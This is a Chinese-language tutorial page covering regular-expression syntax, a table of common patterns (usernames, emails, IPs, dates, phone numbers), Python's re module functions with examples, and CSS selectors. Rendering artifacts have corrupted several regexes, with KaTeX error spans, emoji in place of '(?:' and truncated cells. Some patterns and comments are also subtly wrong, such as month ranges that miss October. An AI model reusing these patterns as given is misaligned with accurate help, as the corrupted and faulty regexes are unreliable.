<strong>re</strong></h2><p><a href="https://tool.oschina.net/regex">在线正则表达式测试 (oschina.net)</a></p><p>正则教程：<a href="https://www.cnblogs.com/poloyy/category/1796055.html">https://www.cnblogs.com/poloyy/category/1796055.html</a></p><h3 id="正则语法"><a class="markdownIt-Anchor" href="#正则语法"></a> <strong>正则语法</strong></h3><table><thead><tr><th>正则字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>&quot;匹配字符&quot;<code>n</code>&quot;。“<code>\n</code>&quot;匹配一个换行符。串行”<code>\\</code>“匹配”<code>\</code>“而”<code>\(</code>“则匹配”<code>(</code>&quot;。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>&quot;或&quot;<code>\r</code>&quot;之后的位置。</td></tr><tr><td>$</td><td>匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>&quot;或&quot;<code>\r</code>&quot;之前的位置。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo*能匹配“<code>z</code>&quot;以及&quot;<code>zoo</code>&quot;。*等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>“能匹配&quot;<code>zo</code>&quot;以及&quot;<code>zoo</code>”，但不能匹配&quot;<code>z</code>&quot;。+等价于{1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>“可以匹配&quot;<code>does</code>&quot;或&quot;<code>does</code>&quot;中的&quot;<code>do</code>”。?等价于{0,1}。</td></tr><tr><td>{<em>n</em>}</td><td><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>“不能匹配&quot;<code>Bob</code>&quot;中的&quot;<code>o</code>”，但是能匹配&quot;<code>food</code>&quot;中的两个o。</td></tr><tr><td>{<em>n</em>,}</td><td><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>“不能匹配&quot;<code>Bob</code>&quot;中的&quot;<code>o</code>”，但能匹配&quot;<code>foooood</code>&quot;中的所有o。&quot;<code>o&#123;1,&#125;</code>“等价于&quot;<code>o+</code>”。&quot;<code>o&#123;0,&#125;</code>“则等价于&quot;<code>o*</code>”。</td></tr><tr><td>{<em>n</em>,<em>m</em>}</td><td><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>&quot;将匹配&quot;<code>fooooood</code>&quot;中的前三个o。&quot;<code>o&#123;0,1&#125;</code>“等价于&quot;<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td>?</td><td>当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>&quot;，&quot;<code>o+?</code>“将匹配单个&quot;<code>o</code>”，而&quot;<code>o+</code>“将匹配所有&quot;<code>o</code>”。</td></tr><tr><td>.</td><td>匹配除“<code>\</code><em><code>n</code></em>&quot;之外的任何单个字符。要匹配包括&quot;<code>\</code><em><code>n</code></em>&quot;在内的任何字符，请使用像&quot;`(.</td></tr><tr><td>(pattern)</td><td>匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>“或”<code>\)</code>&quot;。</td></tr><tr><td>(?:pattern)</td><td>匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td>(?=pattern)</td><td>正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td>(?!pattern)</td><td>正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td>(?&lt;=pattern)</td><td>反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td>(?&lt;!pattern)</td><td>反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td>x|y</td><td>匹配x或y。例如，“`z</td></tr><tr><td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>“可以匹配&quot;<code>plain</code>&quot;中的&quot;<code>a</code>”。</td></tr><tr><td>[^xyz]</td><td>负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>“可以匹配&quot;<code>plain</code>&quot;中的&quot;<code>p</code>”。</td></tr><tr><td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>&quot;可以匹配&quot;<code>a</code>&quot;到&quot;<code>z</code>&quot;范围内的任意小写字母字符。</td></tr><tr><td>[^a-z]</td><td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>&quot;可以匹配任何不在&quot;<code>a</code>&quot;到&quot;<code>z</code>&quot;范围内的任意字符。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>&quot;可以匹配&quot;<code>never</code>&quot;中的&quot;<code>er</code>&quot;，但不能匹配&quot;<code>verb</code>&quot;中的&quot;<code>er</code>&quot;。</td></tr><tr><td>\B</td><td>匹配非单词边界。“<code>er\B</code>&quot;能匹配&quot;<code>verb</code>&quot;中的&quot;<code>er</code>&quot;，但不能匹配&quot;<code>never</code>&quot;中的&quot;<code>er</code>&quot;。</td></tr><tr><td>\cx</td><td>匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>&quot;字符。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于[0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于[^0-9]。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>&quot;。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>&quot;。</td></tr><tr><td>\x<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>&quot;匹配&quot;<code>A</code>&quot;。“<code>\x041</code>&quot;则等价于”<code>\x04&amp;1</code>&quot;。正则表达式中可以使用ASCII编码。.</td></tr><tr><td>*num*</td><td>匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>&quot;匹配两个连续的相同字符。</td></tr><tr><td>*n*</td><td>标识一个八进制转义值或一个向后引用。如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td></tr><tr><td>*nm*</td><td>标识一个八进制转义值或一个向后引用。如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果*nm</em>之前至少有<em>n</em>个获取，则<em>n</em>为一个后跟文字<em>m</em>的向后引用。如果前面的条件都不满足，若<em>n</em>和<em>m</em>均为八进制数字（0-7），则*nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td>*nml*</td><td>如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td>\u<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号</td></tr></tbody></table><blockquote><p>常见正则表达式运算符的优先级：</p></blockquote><ul><li><p><strong>转义符号：</strong> <code>\</code> 是用于转义其他特殊字符的转义符号。它具有最高的优先级。</p><p>示例：<code>\d</code>、<code>\.</code> 等，其中 <code>\d</code> 匹配数字，<code>\.</code> 匹配点号。</p></li><li><p><strong>括号：</strong> 圆括号 <code>()</code> 用于创建子表达式，具有高于其他运算符的优先级。</p><p>示例：<code>(abc)+</code> 匹配 “abc” 一次或多次。</p></li><li><p><strong>量词：</strong> 量词指定前面的元素可以重复的次数。</p><p>示例：<code>a*</code> 匹配零个或多个 “a”。</p></li><li><p><strong>字符类：</strong> 字符类使用方括号 <code>[]</code> 表示，用于匹配括号内的任意字符。</p><p>示例：<code>[aeiou]</code> 匹配任何一个元音字母。</p></li><li><p><strong>断言：</strong> 断言是用于检查字符串中特定位置的条件的元素。</p><p>示例：<code>^</code> 表示行的开头，<code>$</code> 表示行的结尾。</p></li><li><p><strong>连接：</strong> 连接在没有其他运算符的情况下表示字符之间的简单连接。</p><p>示例：<code>abc</code> 匹配 “abc”。</p></li><li><p><strong>管道：</strong> 管道符号 <code>|</code> 表示&quot;或&quot;关系，用于在多个模式之间选择一个。</p><p>示例：<code>cat|dog</code> 匹配 “cat” 或 “dog”。</p></li></ul><h3 id="常用正则"><a class="markdownIt-Anchor" href="#常用正则"></a> 常用正则</h3><table><thead><tr><th>target</th><th>pattern</th></tr></thead><tbody><tr><td>用户名</td><td>/^[a-z0-9_-]{3,16}$/</td></tr><tr><td>密码</td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td>密码2</td><td>(?=^.{8,}<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \d at position 7: )(?=.*\̲d̲)(?=.*\W+)(?=.*…'>)(?=.*\d)(?=.*\W+)(?=.*[A-Z])(?=.*[a-z])(?!.*\n).*</span> (由数字/大写字母/小写字母/标点符号组成，四种都必有，8位以上)</td></tr><tr><td>十六进制值</td><td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td></tr><tr><td>电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \d at position 11: /   /^[a-z\̲d̲]+(\.[a-z\d]+)*…'>/   /^[a-z\d]+(\.[a-z\d]+)*@([\da-z](-[\da-z])?)+(\.{1,2}[a-z]+)+</span>/或\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</td></tr><tr><td>URL</td><td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]<em>)</em>/?$/ 或 [a-zA-z]+://[^\s]*</td></tr><tr><td>IP 地址</td><td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?😦?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ 或 ((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)</td></tr><tr><td>HTML 标签</td><td>/<sup>&lt;([a-z]+)([</sup>&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$/或&lt;(.<em>)(.</em>)&gt;.<em>&lt;/\1&gt;|&lt;(.</em>) /&gt;</td></tr><tr><td>删除代码\注释</td><td>(?&lt;!http:|\S)//.*$</td></tr><tr><td>匹配双字节字符(包括汉字在内)</td><td>[^\x00-\xff]</td></tr><tr><td>汉字(字符)</td><td>[\u4e00-\u9fa5]</td></tr><tr><td>Unicode编码中的汉字范围</td><td>/^[\u2E80-\u9FFF]+$/</td></tr><tr><td>中文及全角标点符号(字符)</td><td>[\u3000-\u301e\ufe10-\ufe19\ufe30-\ufe44\ufe50-\ufe6b\uff01-\uffee]</td></tr><tr><td>日期(年-月-日)</td><td>(\d{4}|\d{2})-((0?([1-9]))|(1[1|2]))-((0?[1-9])|(<a href="%5B1-9%5D">12</a>)|(3[0|1]))</td></tr><tr><td>日期(月/日/年)</td><td>((0?[1-9]{1})|(1[1|2]))/(0?[1-9]|([12][1-9])|(3[0|1]))/(\d{4}|\d{2})</td></tr><tr><td>时间(小时:分钟, 24小时制)</td><td>((1|0?)[0-9]|2[0-3])😦[0-5][0-9])</td></tr><tr><td>中国大陆固定电话号码</td><td>(\d{4}-|\d{3}-)?(\d{8}|\d{7})</td></tr><tr><td>中国大陆手机号码</td><td>1\d{10}</td></tr><tr><td>中国大陆邮政编码</td><td>[1-9]\d{5}</td></tr><tr><td>中国大陆身份证号(15位或18位)</td><td>\d{15}(\d\d[0-9xX])?</td></tr><tr><td>非负整数(正整数或零)</td><td>\d+</td></tr><tr><td>正整数</td><td>[0-9]<em>[1-9][0-9]</em></td></tr><tr><td>负整数</td><td>-[0-9]<em>[1-9][0-9]</em></td></tr><tr><td>整数</td><td>-?\d+</td></tr><tr><td>小数</td><td>(-?\d+)(.\d+)?</td></tr><tr><td>空白行</td><td>\n\s*\r 或者 \n\n(editplus) 或者 ^[\s\S ]*\n</td></tr><tr><td>QQ号码</td><td>[1-9]\d{4,}</td></tr><tr><td>不包含abc的单词</td><td>\b((?!abc)\w)+\b</td></tr><tr><td>匹配首尾空白字符</td><td>^\s*|\s*$</td></tr><tr><td>编辑常用</td><td>以下是针对特殊中文的一些替换(editplus)^[0-9].<em>\n <sup>[</sup>第].</em>\n <sup>[习题].*\n</sup>[\s\S ]<em>\n ^[0-9]</em>. ^[\s\S ]<em>\n &lt;p[^&lt;&gt;</em>]&gt;href=“javascript:if(confirm(‘(.<em>?)‘))window.location=’(.</em>?)’”&lt;span style=&quot;.[<sup>“]*rgb(255,255,255)”&gt;.[</sup>&lt;&gt;]<em></span> <DIV class=xs0>[\s\S]</em>?</DIV></td></tr></tbody></table><h3 id="re库"><a class="markdownIt-Anchor" href="#re库"></a> <strong>re库</strong></h3><p>参考网址：<a href="https://zhuanlan.zhihu.com/p/565487182">https://zhuanlan.zhihu.com/p/565487182</a></p><p>re模块官方文档:<a href="https://docs.python.org/zh-cn/3.8/library/re.html">https://docs.python.org/zh-cn/3.8/library/re.html</a></p><p>正则的匹配模式</p><blockquote><p><strong>flags</strong> : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：</p></blockquote><ol><li>re.I re.IGNORECASE忽略大小写</li><li>re.L re.LOCALE表示特殊字符集 w, W, , B, s, S 依赖于当前环境</li><li>re.M re.MULTILINE多行模式</li><li>re.S  re.DOTALL 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）</li><li>re.U 表示特殊字符集 w, W, , B, d, D, s, S 依赖于 Unicode 字符属性数据库</li><li>re.X re.VERBOSE为了增加可读性，忽略空格和 # 后面的注释,可以在正则表达式中加注解</li><li>re.A re.ASCII  让 \w, \W, \b, \B, \d, \D, \s 和 \S 只匹配ASCII，而不是Unicode。</li></ol><h4 id="单项查找函数"><a class="markdownIt-Anchor" href="#单项查找函数"></a> 单项查找函数</h4><blockquote><p>re.search(pattern,string,flags=0) 三个函数参数相同</p><ul><li>pattern 匹配规则</li><li>string 匹配内容</li><li>flags 匹配模式</li></ul></blockquote><ul><li>re.search: 会匹配整个字符串，并返回第一个成功的匹配。如果匹配失败，则返回None</li><li>re.match:  必须从字符串开头匹配</li><li>re.fullmatch: 整个字符串与正则完全匹配</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#search实例</span><span class="token keyword">import</span> re<span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>info<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'([0-9]&#123;2&#125;)'</span><span class="token punctuation">)</span><span class="token comment">#[0-9]&#123;2&#125;表示0-9的任意数字匹配2次，()代表作为一组返回</span>result<span class="token operator">=</span>info<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">#('12',)  每次只返回一个，但是如果第二次返回就是('12','34')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#match实例</span><span class="token keyword">import</span> re<span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>info<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'([a-z]&#123;2&#125;)(\d&#123;2&#125;)'</span><span class="token punctuation">)</span><span class="token comment">#group(0)表示a-z的两个任意字符，\d&#123;2&#125;表示数字的两个任意字符</span>result<span class="token operator">=</span>info<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#ab12</span>result1<span class="token operator">=</span>info<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#('ab','12')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#fullmatch实例-比match限制更严格</span><span class="token keyword">import</span> restring<span class="token operator">=</span><span class="token string">"MyTools"</span>pattern<span class="token operator">=</span><span class="token string">'My'</span>re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>string<span class="token punctuation">)</span>re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多项查找函数"><a class="markdownIt-Anchor" href="#多项查找函数"></a> <strong>多项查找函数</strong></h4><ul><li>findall： 从字符串任意位置查找，返回一个列表</li><li>finditer：从字符串任意位置查找，返回一个迭代器</li></ul><blockquote><p>如果可能存在大量的匹配项的话，建议使用finditer函数，一般情况使用findall函数基本没啥影响。列表是一次性生成在内存中，而迭代器是需要使用时一点一点生成出来的，内存使用更优。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#findall实例</span>s<span class="token operator">=</span><span class="token string">'MyToolsMyCompueter'</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment">#['M','M']</span><span class="token comment">#finditer实例</span>it<span class="token operator">=</span>re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span><span class="token string">r"\d+"</span><span class="token punctuation">,</span><span class="token string">"12a32bc43jf3"</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> it<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#12 32 43 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分割函数"><a class="markdownIt-Anchor" href="#分割函数"></a> <strong>分割函数</strong></h4><blockquote><p>re.split(pattern, string, maxsplit=0, flags=0)</p><ul><li>pattern 分割string的正则匹配规则</li><li>maxsplit 最多分割次数</li><li>string 目标字符串</li><li>flags 匹配模式</li></ul></blockquote><p><strong>str.split与re.split的选择</strong>：str.split函数功能简单，不支持正则分割，而re.split支持正则。</p><p>1000次循环以内str.split函数更快，而循环次数1000次以上后re.split函数明显更快，而且次数越多差距越大！</p><p>在<strong>不需要正则支持且数据量和数次不多的情况下使用str.split函数更合适，反之则使用re.split函数</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#split实例</span>s<span class="token operator">=</span><span class="token string">'abc,abc,defg,dds'</span>re<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'(\W+)'</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token comment">#匹配，分割</span><span class="token comment">#['abc', ',  ', 'abc', ',  ', 'defg', ',  ', 'dds']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="替换函数"><a class="markdownIt-Anchor" href="#替换函数"></a> <strong>替换函数</strong></h4><blockquote><p>re.sub(pattern, repl, string, count=0, flags=0)</p><ul><li>pattern 匹配表达式</li><li>repl 用于替换掉string被pattern匹配的字符</li><li>count 表示替换次数</li><li>flags 匹配规则</li></ul><p>re.subn:参数相同但是返回的一个元组(替换后的字符串,替换次数)</p></blockquote><p>值得注意的是：sub函数中的入参：repl替换内容既可以是字符串，也可以是一个函数哦！ 如果repl为函数时，只能有一个入参：Match匹配对象。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sub实例 target：将匹配到结果中小于4的替换成8，大于4的替换成9</span><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    matched<span class="token operator">=</span>value<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>matched<span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'8'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'9'</span><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>result<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\d'</span><span class="token punctuation">,</span>modify<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment">#ab88cd88ef999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#subn实例</span><span class="token keyword">import</span> re<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>subn<span class="token punctuation">(</span><span class="token string">'ov'</span><span class="token punctuation">,</span> <span class="token string">'~*'</span> <span class="token punctuation">,</span> <span class="token string">'movie tickets booking in online'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#('m~*ie tickets booking in online', 1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>编译函数</strong></p><blockquote><p>compile函数</p><p>compile函数将正则表达式的样式编译为一个正则表达式对象（Pattern），且与re模块相同的函数。</p></blockquote><p><strong>用re模块还是正则对象Pattern的选择：</strong></p><p>官方文档推荐：在多次使用某个正则表达式时推荐使用正则对象Pattern 以增加复用性，因为通过 re.compile(pattern) 编译后的模块级函数会被缓存！</p><blockquote><p>re.escape(pattern) 可以转义正则表达式中具有特殊含义的字符，比如：. 或者 *</p><p>re.purge()不常用，清楚正则缓存</p></blockquote><h2 id="css-selector"><a class="markdownIt-Anchor" href="#css-selector"></a> css-selector</h2><h3 id="基本选择器"><a class="markdownIt-Anchor" href="#基本选择器"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E5%9F%BA%E6%9C%AC%E9%80%89%E6%8B%A9%E5%99%A8">基本选择器</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Universal_selectors">通用选择器</a></p><p>​    选择所有元素。（可选）可以将其限制为特定的名称空间或所有名称空间。    <strong>语法：</strong><code>*</code> <code>ns|*</code> <code>*|*</code>    <strong>例子：</strong><code>*</code> 将匹配文档的所有元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Type_selectors">元素选择器</a></p><p>​    按照给定的节点名称，选择所有匹配的元素。    <strong>语法：</strong><code>elementname</code>    <strong>例子：</strong><code>input</code> 匹配任何 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input">``</a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Class_selectors">类选择器</a></p><p>​    按照给定的 <code>class</code> 属性的值，选择所有匹配的元素。    <strong>语法：</strong><code>.classname</code>    <strong>例子：</strong><code>.index</code> 匹配任何 <code>class</code> 属性中含有 “index” 类的元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/ID_selectors">ID 选择器</a></p><p>​    按照 <code>id</code> 属性选择一个与之匹配的元素。需要注意的是，一个文档中，每个 ID 属性都应当是唯一的。    <strong>语法：</strong><code>#idname</code>    <strong>例子：</strong><code>#toc</code> 匹配 ID 为 “toc” 的元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">属性选择器</a></p><p>​    按照给定的属性，选择所有匹配的元素。    <strong>语法：</strong><code>[attr]</code> <code>[attr=value]</code> <code>[attr~=value]</code> <code>[attr|=value]</code> <code>[attr^=value]</code> <code>[attr$=value]</code> <code>[attr*=value]</code>    <strong>例子：</strong><code>[autoplay]</code> 选择所有具有 <code>autoplay</code> 属性的元素（不论这个属性的值是什么）。</p></li></ul><h3 id="分组选择器grouping-selector"><a class="markdownIt-Anchor" href="#分组选择器grouping-selector"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E5%88%86%E7%BB%84%E9%80%89%E6%8B%A9%E5%99%A8%EF%BC%88grouping_selector%EF%BC%89">分组选择器（Grouping selector）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Selector_list">选择器列表</a></p><p>​    <code>,</code> 是将不同的选择器组合在一起的方法，它选择所有能被列表中的任意一个选择器选中的节点。    <strong>语法：</strong><code>A, B</code>    <strong>示例：</strong><code>div, span</code> 会同时匹配 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span) 元素和 [</code></a> 元素。</p></li></ul><h3 id="组合器combinator"><a class="markdownIt-Anchor" href="#组合器combinator"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88combinator%EF%BC%89">组合器（Combinator）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Descendant_combinator">后代组合器</a></p><p>​    “ ”（空格）组合器选择前一个元素的后代节点。    <strong>语法：</strong><code>A B</code>    <strong>例子：</strong><code>div span</code> 匹配所有位于任意 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div) 元素之内的 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Child_combinator">直接子代组合器</a></p><p>​    <code>&gt;</code> 组合器选择前一个元素的直接子代的节点。    <strong>语法：</strong><code>A &gt; B</code>    <strong>例子：</strong><code>ul &gt; li</code> 匹配直接嵌套在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul) 元素内的所有 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Subsequent-sibling_combinator">一般兄弟组合器</a></p><p>​    <code>~</code> 组合器选择兄弟元素，也就是说，后一个节点在前一个节点后面的任意位置，并且共享同一个父节点。    <strong>语法：</strong><code>A ~ B</code>    <strong>例子：</strong><code>p ~ span</code> 匹配同一父元素下，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p) 元素后的所有 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Next-sibling_combinator">紧邻兄弟组合器</a></p><p>​    <code>+</code> 组合器选择相邻元素，即后一个元素紧跟在前一个之后，并且共享同一个父节点。    <strong>语法：</strong><code>A + B</code>    <strong>例子：</strong><code>h2 + p</code> 会匹配<em>紧</em>邻在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/Heading_Elements">h2</a> 元素后的第一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p">``</a> 元素。</p></li><li><p><a 